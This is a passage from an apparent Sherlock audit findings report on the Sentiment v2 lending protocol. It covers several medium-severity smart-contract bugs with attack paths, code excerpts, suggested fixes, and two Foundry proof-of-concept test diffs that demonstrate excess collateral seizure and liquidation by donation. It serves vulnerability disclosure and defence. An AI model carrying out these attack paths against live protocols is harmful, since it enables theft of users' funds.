Implement virtual shares or another mechanism to prevent rounding errors and price manipulation, especially when the pool is empty or has a very low total supply.

# Issue M-36: In `SuperPool`, an attacker can move assets to a specific base pool 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/487 

## Found by 
iamnmt
### Summary

In `SuperPool`, the design supply to pools and withdraw from pools in queue will allow an attacker to move assets to a specific base pool.

### Root Cause

The design supply to pools and withdraw from pools in queue

https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/SuperPool.sol#L524-L543
https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/SuperPool.sol#L548-L580

### Internal pre-conditions

Let's call a base pool that an attacker want to move assets is `X`.
1. Every base pool before `X` in `depositQueue` have `SuperPool#poolCapFor[poolId] != type(uint256).max` or `Pool#poolDataFor[poolId].poolCap != type(uint256).max`. The meaning of this pre-condition is there is way to deposit to `X`. 
2. There is exist a base pool before `X` in `withdrawQueue` that the `SuperPool` has assets in.

### External pre-conditions

_No response_

### Attack Path

There is a `SuperPool` that has:
- `depositQueue = [A, B, X]`
- `SuperPool#poolCapFor[A] = 100, Pool#poolDataFor[B].poolCap = 100`
- `Pool#getTotalAssets(A) = 50, Pool#getTotalAssets(B) = 50, Pool#getTotalAssets(X) = 0`
- `Pool#getAssetsOf(A, address(SuperPool)) = 50, Pool#getAssetsOf(B, address(SuperPool)) = 50, Pool#getAssetsOf(X, address(SuperPool)) = 0`
- `withdrawQueue = [A, B, X]`

This `SuperPool` is satisfied the internal pre-conditions. The base pool `A` represents for base pools that have `SuperPool#poolCapFor[poolId] != type(uint256).max`. The base pool `B` represents for base pools that have `Pool#poolDataFor[poolId].poolCap != type(uint256).max`. The goal of this attack is to move assets from `A, B` to `X`.

An attacker performs the attack in one transaction:
1. Call to `SuperPool#deposit(50, attacker)`. New state:
   - `Pool#getTotalAssets(A) = 100`
   - `Pool#getAssetsOf(A, address(SuperPool)) = 100`
2. Call to `Pool#deposit(B, 50, attacker)`. New state:
   - `Pool#getTotalAssets(B) = 100`
3. Call to `SuperPool#deposit(100, attacker)`. The `SuperPool` will deposit to `X` because `SuperPool#poolCapFor[A], Pool#poolDataFor[B].poolCap` are reached. New state:
   - `Pool#getTotalAssets(X) = 100`
   - `Pool#getAssetsOf(X, address(SuperPool)) = 100`
4. Call to `SuperPool#withdraw(100, attacker, attacker)`. New state:
   - `Pool#getTotalAssets(A) = 0, Pool#getTotalAssets(B) = 0, Pool#getTotalAssets(X) = 100`
   - `Pool#getAssetsOf(A, address(SuperPool)) = 0, Pool#getAssetsOf(B, address(SuperPool)) = 0, Pool#getAssetsOf(X, address(SuperPool)) = 100`
5. Call to `Pool#withdraw(B, 50, attacker)`. The attacker retrieves the funds deposited in step 2.

The attacker moved all assets to `X`. By doing this attack in one transaction, the attacker can flash-loan `150` tokens at the start of the attack for step 1 and 2, and then returns `150` tokens back at the end of the attack. Note that, the attacker does not hold any shares of `SuperPool` or `Pool` at the end of the attack. Meaning the cost this attack is only gas fee and flash-loan fee.

### Impact

By moving assets to a specific base pool, an attacker can cause the following larger impacts:
- Front-running `PositionManager#liquidateBadDebt` with this attack to cause loss of funds for the `SuperPool`. When the protocol calls `PositionManager#liquidateBadDebt`, a base pool that has its bad debt being liquidated will suffer a loss. So, the attacker will move assets from other pools to the pools that has its bad debt being liquidated, which will cause loss of funds to the `SuperPool`.
- Use liquidity from other pools for withdrawing in the attacker's desired pool. Users can not call to `Pool#withdraw` when `maxWithdrawAssets` is not enough. In case of, the pool that the attacker want to withdraw from does not have enough liquidity, the attacker can perform this attack to move assets from other pools to their desired pool.
- Move assets to a low performance pool to cause loss of yield for the `SuperPool`.

### PoC

_No response_

### Mitigation

Add a two-step `SuperPool#deposit/mint`. First the users stage their `deposit/mint`. After a short timelock (E.g: 10 seconds), the users can finalize their `deposit/mint`. This will prevent the attack that uses flash-loan, but if the attacker has enough liquidity, then this attack still can happen.

# Issue M-37: User can revert the `positionBeacon`  value set by  the ADMIN. 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/506 

## Found by 
0xRstStn, Tendency, dhank
## Summary
User can revert the `positionBeacon`  value set by  the ADMIN.

## Vulnerability Detail
Using  the `setBeacon()` , owner can change the value of `positionBeacon` to a  new Address.

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L503-L506

At the same time we have `updateRegistry()` which is a public function where the positionBeacon is set from the values of Registr contract.
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L204-L208

    function updateFromRegistry() public {
        pool = Pool(registry.addressFor(SENTIMENT_POOL_KEY));
        riskEngine = RiskEngine(registry.addressFor(SENTIMENT_RISK_ENGINE_KEY));
        positionBeacon = registry.addressFor(SENTIMENT_POSITION_BEACON_KEY);
    }
## Impact
Any User can revert the `positionBeacon`  value set by  the ADMIN.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/PositionManager.sol#L204-L208

## Tool used

Manual Review

## Recommendation

positionBeacon update can be omiited from the updateRegistry.

# Issue M-38: Security considerations of ERC6909 are not complied, thus an operator can steal funds 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/519 

## Found by 
dimah7
## Summary

The protocol's pools are strictly compilant with ERC6909, which introduces the `operator` model. An operator is an account which is granted permission to transfer assets on behalf of the `owner`. 

Also according to [ERC6909 specification security considerations](https://eips.ethereum.org/EIPS/eip-6909#security-considerations): 

1. ```The first consideration is consistent with all delegated permission models. Any account with operator permissions may transfer any amount of any token id on behalf of the owner until the operator permission is revoked```
2. ```The second consideration is unique to systems with both delegated permission models. In accordance with the `transferFrom`In accordance with the transferFrom method method, spenders with operator permission are not subject to allowance restrictions, spenders with infinite approvals SHOULD NOT have their allowance deducted on delegated transfers``` 

However these security considerations are not taken of concern. This allows an operator to transfer all the available token balance of the `owner` to himself. And since for this contest, it's confirmed that only the owners of pools, super pools and position manager are considered as TRUSTED, the operator role is not an owner i consider this scenario likely to happen.

## Vulnerability Detail

The problem lies in the `Pool::withdraw()` function: 

```javascript
function withdraw(uint256 poolId, uint256 assets, address receiver, address owner) public returns (uint256 shares) {
        ...
        if (msg.sender != owner && !isOperator[owner][msg.sender]) {
            uint256 allowed = allowance[owner][msg.sender][poolId];
            if (allowed != type(uint256).max) allowance[owner][msg.sender][poolId] = allowed - shares;
        }
        ...

@>      IERC20(pool.asset).safeTransfer(receiver, assets);
```

As can be seen the caller can specify any address as the receiver.

## Impact

- Impact: High, the entire balance of the owner can be drained
- Likelihood: Medium, because:
  - 1. an owner can revoke the operator role anytime, so an operator can frontrun such transactions to prevent, but some chains have private mempools, so this only partially mitigates the likelihood
  - 2. since by spec, the operator is granted infinite approval, the attacker needs only one successful tx to steal the tokens
- Overall: High/Medium -> High

## Code Snippet

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L371

## Tool used

Manual Review

## Recommendation

Restrict the operator to be able to transfer to himself: 

```javascript
if (receiver == msg.sender && msg.sender != owner) revert("Operator cannot transfer to themselves");
```

But since he can choose any address, this exploit is not fully mitigated, consider if having an operator for the pools is in need.

# Issue M-39: Rounding Error in Calculating `newBorrowAssets` during borrow/repayment 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/529 

## Found by 
0xAlix2, KupiaSec
## Summary
During the borrow/repayment operation in the pool, a rounding error arises when calculating `newBorrowAssets`, causing it to mismatch with the amount returned by `getBorrowsOf`, which I believe should align.

## Vulnerability Detail
`newBorrowAssets` is meant to indicate the entire debt associated with a position, capturing the total amount of assets required to fully repay the debt obligation.
I believe it should match the value given by getBorrowsOf, assuming that a repayment could occur immediately without any interest having accrued. Nevertheless, due to differences in the rounding directions used in these calculations, inconsistencies can occur.

As a consequence, even a small discrepancy might lead to `newBorrowAssets` falling below `minDebt`, which in turn can trigger the transaction to revert with the `Pool_DebtTooLow` error.

In `borrow` function, it used Math.Rounding.Down:
```solidity
    function borrow(uint256 poolId, address position, uint256 amt) external returns (uint256 borrowShares) {
        ...
        uint256 newBorrowAssets = _convertToAssets(
            borrowSharesOf[poolId][position] + borrowShares,
            pool.totalBorrowAssets + amt,
            pool.totalBorrowShares + borrowShares,
>           Math.Rounding.Down
        );
        if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
            revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
        }
```
In `getBorrowsOf` function, it used Math.Rounding.Up:
```solidity
    function getBorrowsOf(uint256 poolId, address position) public view returns (uint256) {
        PoolData storage pool = poolDataFor[poolId];
        (uint256 accruedInterest,) = simulateAccrue(pool);
        // [ROUND] round up to enable enable complete debt repayment
        return _convertToAssets(
            borrowSharesOf[poolId][position],
            pool.totalBorrowAssets + accruedInterest,
            pool.totalBorrowShares,
>            Math.Rounding.Up
        );
    }
```

Same happens in `repay` function:
```solidity
    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
        ...
        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
        if (remainingShares > 0) {
            uint256 newBorrowAssets = _convertToAssets(
>               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
            );
            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
            }
        }
```

## Impact
This represents a notable instance of a `rounding error`, and although it is not a frequent occurrence, it can cause borrow or repay operations to unjustly revert with the `Pool_DebtTooLow` error.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L450

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L238

https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/Pool.sol#L509

## Tool used
Manual Review

## Recommendation
Adjust the rounding method to `Math.Rounding.Up` when calculating `newBorrowAssets`.

In `borrow` function:
```diff
    function borrow(uint256 poolId, address position, uint256 amt) external returns (uint256 borrowShares) {
        ...
        uint256 newBorrowAssets = _convertToAssets(
            borrowSharesOf[poolId][position] + borrowShares,
            pool.totalBorrowAssets + amt,
            pool.totalBorrowShares + borrowShares,
-           Math.Rounding.Down
+           Math.Rounding.Up
        );
        if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
            revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
        }
```

In `repay` function:
```diff
    function repay(uint256 poolId, address position, uint256 amt) external returns (uint256 remainingShares) {
        ...
        remainingShares = borrowSharesOf[poolId][position] - borrowShares;
        if (remainingShares > 0) {
            uint256 newBorrowAssets = _convertToAssets(
-               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Down
+               remainingShares, pool.totalBorrowAssets - amt, pool.totalBorrowShares - borrowShares, Math.Rounding.Up
            );
            if (_getValueOf(pool.asset, newBorrowAssets) < minDebt) {
                revert Pool_DebtTooLow(poolId, pool.asset, newBorrowAssets);
            }
        }
```

# Issue M-40: Lack of oracle validation in `acceptLtvUpdate` can result in a DoS for the Pool-Asset pair 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/548 

## Found by 
Yashar
## Summary
The `RiskEngine.sol` allows pool owners to request LTV updates with a 72-hour timelock. However, while the `requestLtvUpdate` function checks for a valid oracle, the `acceptLtvUpdate` function does not. This could lead to a situation where an LTV update is accepted after the oracle has been removed or invalidated, resulting in DoS for the Pool-Asset pair.

## Vulnerability Detail
Pool owners can [update LTV parameters](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L167-L187) using the `requestLtvUpdate` function, which employs a 72-hour timelock before the LTV change takes effect. During the request phase, the function [ensures a valid oracle is set](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L171) for the asset:
```solidity
        // set oracle before ltv so risk modules don't have to explicitly check if an oracle exists
        if (oracleFor[asset] == address(0)) revert RiskEngine_NoOracleFound(asset);
```

After the timelock, the pool owner [can accept this request via the `acceptLtvUpdate`](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190-L210) function. However, given the 72-hour delay, there is a possibility that the protocol's admin could remove or change the oracle for the asset. The `acceptLtvUpdate` function does not re-check the oracle's validity before updating the LTV:
```solidity
    function acceptLtvUpdate(uint256 poolId, address asset) external {
        if (msg.sender != pool.ownerOf(poolId)) revert RiskEngine_OnlyPoolOwner(poolId, msg.sender);

        LtvUpdate memory ltvUpdate = ltvUpdateFor[poolId][asset];

        // revert if there is no pending update
        if (ltvUpdate.validAfter == 0) revert RiskEngine_NoLtvUpdate(poolId, asset);

        // revert if called before timelock delay has passed
        if (ltvUpdate.validAfter > block.timestamp) revert RiskEngine_LtvUpdateTimelocked(poolId, asset);

        // revert if timelock deadline has passed
        if (block.timestamp > ltvUpdate.validAfter + TIMELOCK_DEADLINE) {
            revert RiskEngine_LtvUpdateExpired(poolId, asset);
        }

        // apply changes
        ltvFor[poolId][asset] = ltvUpdate.ltv;
        delete ltvUpdateFor[poolId][asset];
        emit LtvUpdateAccepted(poolId, asset, ltvUpdate.ltv);
    }
```

If the LTV is updated for an asset without an oracle, the `getAssetValue` function, which [fetches the asset's price from the oracle](https://github.com/sentimentxyz/protocol-v2/blob/04bf15565165396608cc0aedacf05897235518fd/src/RiskModule.sol#L183-L187), will always revert, resulting in a DoS for the given Pool-Asset pair.

## Impact
If the LTV is updated for an asset without an oracle, it will cause a DoS for the affected Pool-Asset pair, as any attempts to fetch the asset's value will revert.

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L167-L187
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskEngine.sol#L190-L210
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/main/protocol-v2/src/RiskModule.sol#L183-L187

## Tool used

Manual Review

## Recommendation
Re-check the validity of the oracle for the asset upon accepting the ltv update:
```diff
    function acceptLtvUpdate(uint256 poolId, address asset) external {
        if (msg.sender != pool.ownerOf(poolId)) revert RiskEngine_OnlyPoolOwner(poolId, msg.sender);

+       if (oracleFor[asset] == address(0)) revert RiskEngine_NoOracleFound(asset);
+
        LtvUpdate memory ltvUpdate = ltvUpdateFor[poolId][asset];

        // revert if there is no pending update
        if (ltvUpdate.validAfter == 0) revert RiskEngine_NoLtvUpdate(poolId, asset);

        // revert if called before timelock delay has passed
        if (ltvUpdate.validAfter > block.timestamp) revert RiskEngine_LtvUpdateTimelocked(poolId, asset);

        // revert if timelock deadline has passed
        if (block.timestamp > ltvUpdate.validAfter + TIMELOCK_DEADLINE) {
            revert RiskEngine_LtvUpdateExpired(poolId, asset);
        }

        // apply changes
        ltvFor[poolId][asset] = ltvUpdate.ltv;
        delete ltvUpdateFor[poolId][asset];
        emit LtvUpdateAccepted(poolId, asset, ltvUpdate.ltv);
    }
```

# Issue M-41: User's can seize more assets during liquidation by using type(uint).max 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/556 

## Found by 
A2-security, Brenzee, EgisSecurity, hash, serial-coder, sl1
## Summary
User's can seize more assets during liquidation than what should be actually allowed by replaying the repayment amount using type(uint).max 

## Vulnerability Detail
The liquidators are restricted on the amount of collateral they can seize during a liquidation

Eg:
if a position has 1e18 worth debt, and 2e18 worth collateral, then on a liquidation the user cannot seize 2e18 collateral by repaying the 1e18 debt, and they are limited to seizing for ex. 1.3e18 worth of collateral (depends on the liquidation discount how much profit a liquidator is able to generate)

The check for this max seizable amount is kept inside `_validateSeizedAssetValue`

[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145)
```solidity
    function _validateSeizedAssetValue(
        address position,
        DebtData[] calldata debtData,
        AssetData[] calldata assetData,
        uint256 discount
    ) internal view {
        // compute value of debt repaid by the liquidator
        uint256 debtRepaidValue;
        uint256 debtLength = debtData.length;
        for (uint256 i; i < debtLength; ++i) {
            uint256 poolId = debtData[i].poolId;
            uint256 amt = debtData[i].amt;
            if (amt == type(uint256).max) amt = pool.getBorrowsOf(poolId, position);
            address poolAsset = pool.getPoolAssetFor(poolId);
            IOracle oracle = IOracle(riskEngine.getOracleFor(poolAsset));
            debtRepaidValue += oracle.getValueInEth(poolAsset, amt);
        }

        .....

        uint256 maxSeizedAssetValue = debtRepaidValue.mulDiv(1e18, (1e18 - discount));
        if (assetSeizedValue > maxSeizedAssetValue) {
            revert RiskModule_SeizedTooMuch(assetSeizedValue, maxSeizedAssetValue);
        }
```

But the `_validateSeizedAssetValue` is flawed as it assumes that the value `type(uint256).max` will result in the liquidator repaying the current `pool.getBorrowsOf(poolId, position)` value. In the actual execution, an attacker can repay some amount earlier and then use `type(uint256).max` on the same pool which will result in a decreased amount because debt has been repaid earlier

Eg:
getBorrows of position = 1e18
user passes in 0.9e18 and type(uint).max as the repaying values
the above snippet will consider it as 0.9e18 + 1e18 being repaid and hence allow for more than 1.9e18 worth of collateral to be seized
but during the actual execution, since 0.9e18 has already been repaid, only 0.1e18 will be transferred from the user allowing the user

### POC Code
Apply the following diff and run `testHash_LiquidateExcessUsingDouble`. It is asserted that a user can use this method to seize the entire collateral of the debt position even though it results in a much higher value than what should be actually allowed

```diff
diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
index beaca63..29e674a 100644
--- a/protocol-v2/test/integration/LiquidationTest.t.sol
+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
@@ -48,6 +48,85 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
     }
 
+    function testHash_LiquidateExcessUsingDouble() public {
+        vm.startPrank(user);
+        asset2.approve(address(positionManager), 1e18);
+
+        // deposit 1e18 asset2, borrow 1e18 asset1
+        Action[] memory actions = new Action[](7);
+        (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
+        actions[1] = deposit(address(asset2), 1e18);
+        actions[2] = addToken(address(asset2));
+        actions[3] = borrow(fixedRatePool, 1e18);
+        actions[4] = approve(address(mockswap), address(asset1), 1e18);
+        bytes memory data = abi.encodeWithSelector(SWAP_FUNC_SELECTOR, address(asset1), address(asset2), 1e18);
+        actions[5] = exec(address(mockswap), 0, data);
+        actions[6] = addToken(address(asset3));
+        positionManager.processBatch(position, actions);
+        vm.stopPrank();
+        assertTrue(riskEngine.isPositionHealthy(position));
+
+        (uint256 totalAssetValue, uint256 totalDebtValue, uint256 minReqAssetValue) = riskEngine.getRiskData(position);
+
+        assertEq(totalAssetValue, 2e18);
+        assertEq(totalDebtValue, 1e18);
+        assertEq(minReqAssetValue, 2e18);
+
+        // modify asset2 price from 1eth to 0.9eth
+        // now there is 1e18 debt and 1.8e18 worth of asset2
+        FixedPriceOracle pointOneEthOracle = new FixedPriceOracle(0.9e18);
+        vm.prank(protocolOwner);
+        riskEngine.setOracle(address(asset2), address(pointOneEthOracle));
+        assertFalse(riskEngine.isPositionHealthy(position));
+        
+        // maximumSeizable amount with liquidation discount : 1388888888888888888 ie. 1.38e18
+        uint liquidationDiscount = riskEngine.riskModule().LIQUIDATION_DISCOUNT();
+        uint supposedMaximumSeizableAssetValue = totalDebtValue * 1e18 / (1e18 - liquidationDiscount);
+        uint maximumSeizableAssets = supposedMaximumSeizableAssetValue * 1e18 / 0.9e18;
+
+        assert(maximumSeizableAssets == 1388888888888888888);
+
+        DebtData memory debtData = DebtData({ poolId: fixedRatePool, amt: 1e18 });
+        DebtData[] memory debts = new DebtData[](1);
+        debts[0] = debtData;
+
+        // verifying that attempting to seize more results in a revert
+        // add dust to cause minimal excess
+        AssetData memory asset2Data = AssetData({ asset: address(asset2), amt: maximumSeizableAssets + 10 });
+        AssetData[] memory assets = new AssetData[](1);
+        assets[0] = asset2Data;
+
+        asset1.mint(liquidator, 10e18);
+
+        vm.startPrank(liquidator);
+        asset1.approve(address(positionManager), 1e18);
+
+        // seizeAttempt value : 1250000000000000008, seizable value : 1250000000000000000
+        vm.expectRevert(abi.encodeWithSelector(RiskModule.RiskModule_SeizedTooMuch.selector, 1250000000000000008, 1250000000000000000));
+        positionManager.liquidate(position, debts, assets);
+        vm.stopPrank();
+
+        // but an attacker can liquidate almost double by exploiting the type.max issue
+        debtData = DebtData({ poolId: fixedRatePool, amt: 0.9e18 });
+        debts = new DebtData[](2);
+        debts[0] = debtData;
+
+        // replay the balance value. this will cause the repaid amount to be double counted allowing the user to liquidate the entire assets
+        debtData = DebtData({ poolId: fixedRatePool, amt: type(uint256).max });
+        debts[1] = debtData;
+
+        // liquidate full asset balance
+        asset2Data = AssetData({ asset: address(asset2), amt: 2e18 });
+        assets = new AssetData[](1);
+        assets[0] = asset2Data;
+
+        // liquidate
+        vm.startPrank(liquidator);
+        asset1.approve(address(positionManager), 1e18);
+        positionManager.liquidate(position, debts, assets);
+        vm.stopPrank();
+    }
+
     function testLiquidate() public {
         vm.startPrank(user);
         asset2.approve(address(positionManager), 1e18);
```

## Impact
Borrowers will loose excess collateral during liquidation

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L129-L145

## Tool used
Manual Review

## Recommendation
Only allow a one entry for each poolId in the `debtData` array. This can be enforced by checking that the array is in a strictly sequential order on pools 

# Issue M-42: Formula used for minimum required collateral value is flawed 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/558 

## Found by 
hash
## Summary
The formula that is used to calculate the minimum required collateral value for a position is flawed and allows attackers to liquidate user's by donating assets

## Vulnerability Detail
A position is considered non-healthy ie. liquidateable when the collateral value is less than `minReqAssetValue`

[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L67-L85)
```solidity
    function isPositionHealthy(address position) public view returns (bool) {
        
        ....

        uint256 minReqAssetValue =
            _getMinReqAssetValue(debtPools, debtValueForPool, positionAssets, positionAssetWeight, position);
        return totalAssetValue >= minReqAssetValue; // (non-zero debt, non-zero assets)
    }
```

Where `minReqAssetValue` is calculated as follows:
[link](https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272)
```solidity
    function _getMinReqAssetValue(
        uint256[] memory debtPools,
        uint256[] memory debtValuleForPool,
        address[] memory positionAssets,
        uint256[] memory wt,
        address position
    ) internal view returns (uint256) {
        
        ....

        for (uint256 i; i < debtPoolsLength; ++i) {
            for (uint256 j; j < positionAssetsLength; ++j) {
                
                ....

                minReqAssetValue += debtValuleForPool[i].mulDiv(wt[j], ltv, Math.Rounding.Up);
            }
        }
```

Here `wt[j]` is the weight of the collateral token by value ie. if in a pool there is 1 worth of collateral A and 1 worth of collateral B, then both have weights as 0.5,0.5. `ltv` is the loan to value ratio. 

This method of calculation of `minReqAssetValue` is flawed as it can allow an attacker to donate and increase balance of the lower ltv token causing higher portion of the debt to be assigned to the lower ltv token which can increase the minReqAssetValue in a way such that it is not covered by the donated amount

Eg:
all tokens prices = 1
ltv a = 20%, ltv b = 80%
initial collateral amounts: 40a, 160b (2:8)
debt amount = 100
currently healthy position,
minReqAssetValue = (100 * 0.2 / 0.2) + (100 * 0.8 / 0.8) == 200 == collateral value

attacker donates 1 token a
now token weights = 41:160
now minReqAssetValue = (100 * (41/201) / 0.2 ) + (100 * (160/201) / 0.8) == 201.492537313 while collateral value == 200 + 1 == 201

hence liquidateable

attacker can now liquidate the position making a profit with the 10% liquidation discount

### POC Code
Apply the following diff and run `testHash_LiquidatePositionByDonation`. It is asserted that a pool that was healthy can be made liquidateable by an attacker by making a donation which will be covered by their profit

```diff
diff --git a/protocol-v2/test/integration/LiquidationTest.t.sol b/protocol-v2/test/integration/LiquidationTest.t.sol
index beaca63..4dcd863 100644
--- a/protocol-v2/test/integration/LiquidationTest.t.sol
+++ b/protocol-v2/test/integration/LiquidationTest.t.sol
@@ -33,9 +33,9 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
 
         vm.startPrank(poolOwner);
-        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.5e18); // 2x lev
+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset3), 0.8e18); // 2x lev
         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset3));
-        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.5e18); // 2x lev
+        riskEngine.requestLtvUpdate(fixedRatePool, address(asset2), 0.2e18); // 2x lev
         riskEngine.acceptLtvUpdate(fixedRatePool, address(asset2));
         vm.stopPrank();
 
@@ -48,6 +48,43 @@ contract LiquidationTest is BaseTest {
         vm.stopPrank();
     }
 
+    function testHash_LiquidatePositionByDonation() public {
+        // asset 1,2,3 price = 1 and asset 2 ltv = 0.2 and asset 3 ltv = 0.8
+        // borrow 100 debt and put asset2:asset3 collateral value in 2:8
+        // setup tokens
+        {
+            uint256 asset2CollateralAmount = 40e18;
+            uint256 asset3CollateralAmount = 160e18;
+            asset2.mint(user, asset2CollateralAmount);
+            asset3.mint(user, asset3CollateralAmount);
+            vm.startPrank(user);
+            asset2.approve(address(positionManager), asset2CollateralAmount);
+            asset3.approve(address(positionManager), asset3CollateralAmount);
+
+            Action[] memory actions = new Action[](6);
+            (position, actions[0]) = newPosition(user, bytes32(uint256(0x123456789)));
+            actions[1] = deposit(address(asset2), asset2CollateralAmount);
+            actions[2] = deposit(address(asset3), asset3CollateralAmount);
+            actions[3] = addToken(address(asset2));
+            actions[4] = addToken(address(asset3));
+            actions[5] = borrow(fixedRatePool, 100e18);
+            positionManager.processBatch(position, actions);
+            vm.stopPrank();
+        }
+
+        assertTrue(riskEngine.isPositionHealthy(position));
+
+        //attacker deposits 1 more asset2, makes the position liquidateable and liquidates the position
+        address attacker = address(0xd33d33);
+        asset2.mint(attacker,1e18);
+
+        vm.prank(attacker);
+        asset2.transfer(position,1e18);
+        assertTrue(!riskEngine.isPositionHealthy(position));
+
+        // attacker can liquidate 100e18 debt for a liquidation profit of 10% making a net profit
+    }
+
     function testLiquidate() public {
         vm.startPrank(user);
         asset2.approve(address(positionManager), 1e18);

```

## Impact
User's can be liquidated by attackers even when they have maintained enough collateral value

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/25a0c8aeaddec273c5318540059165696591ecfb/protocol-v2/src/RiskModule.sol#L272

## Tool used
Manual Review

## Recommendation 

# Issue M-43: Attacker can inflict losses to other Superpool user's during a bad debt liquidation depending on the deposit/withdraw queue order 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/564 

## Found by 
hash
## Summary
Attacker can inflict losses to other Superpool user's during a bad debt liquidation depending on the deposit/withdraw queue order

## Vulnerability Detail
On bad debt liquidation the underlying BasePool depositors eats losses

```solidity
    function rebalanceBadDebt(uint256 poolId, address position) external {
        
        .....

        pool.totalDepositAssets = (totalDepositAssets > borrowAssets) ? totalDepositAssets - borrowAssets : 0;
```
In a superpool this allows an attacker to inflict more losses to others depending on the deposit/withdraw pool order without suffering any losses for himself if he can deposit more assets in the to be affected pool and withdraw from another pool

```solidity
    function reorderDepositQueue(uint256[] calldata indexes) external onlyOwner {
        if (indexes.length != depositQueue.length) revert SuperPool_QueueLengthMismatch(address(this));
        depositQueue = _reorderQueue(depositQueue, indexes);
    }


    /// @notice Reorders the withdraw queue, based in withdraw priority
    /// @param indexes The new withdrawQueue, in order of priority
    function reorderWithdrawQueue(uint256[] calldata indexes) external onlyOwner {
        if (indexes.length != withdrawQueue.length) revert SuperPool_QueueLengthMismatch(address(this));
        withdrawQueue = _reorderQueue(withdrawQueue, indexes);
    }
```

Eg:
poolA = 100 value, 100shares
poolB = 100 value, 100shares
superPool deposit order [poolA,poolB]
superPool withdraw order [poolB,poolA]
superPool balance = 100 value, all deposited in poolB
bad debt liqudiation of 100 for poolA is about to happen
attacker deposits 100 value in superpool and withdraws 100
attacker suffers no loss
now superPool has entire balance in poolA
poolA = 200value , 200 shares
after bad debt liquidation, poolA = 100 value,200shares
this loss is beared by the other superpool depositors

## Impact
Attacker can inflict losses to other superpool depositors

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/SuperPool.sol#L345-L355

## Tool used
Manual Review

## Recommendation
Monitor for bad debt and manage the bad debt pool

# Issue M-44: `feeRecipeint` lacks setter function 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/571 

## Found by 
hash
## Summary
`feeRecipeint` lacks setter function

## Vulnerability Detail
The `feeRecipient` variable of Pool.sol is intended to be updated but lacks a setter function and hence cannot be updated

## Impact
`feeRecipient` cannot be updated

## Code Snippet
https://github.com/sherlock-audit/2024-08-sentiment-v2/blob/0b472f4bffdb2c7432a5d21f1636139cc01561a5/protocol-v2/src/Pool.sol#L50

## Tool used
Manual Review

## Recommendation
Add a setter function

# Issue M-45: Incorrect decimal adjustment in `ChainlinkUsdOracle` 

Source: https://github.com/sherlock-audit/2024-08-sentiment-v2-judging/issues/579 

## Found by 
